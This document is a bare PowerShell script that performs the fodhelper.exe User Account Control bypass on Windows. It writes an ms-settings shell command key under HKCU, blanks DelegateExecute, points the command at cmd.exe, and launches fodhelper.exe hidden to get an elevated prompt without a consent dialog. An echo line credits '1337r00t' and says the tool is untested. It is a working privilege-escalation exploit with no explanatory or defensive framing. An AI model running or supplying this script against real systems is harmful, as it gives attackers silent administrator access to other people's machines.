
Invoke-Expression -Command 'echo Coded By 1337r00t Sorry i Am not testing this tool'
New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force
New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'cmd /k cmd.exe' -Force

Start-Process 'C:\Windows\System32\fodhelper.exe' (Resolve-Path .\).Path -WindowStyle Hidden
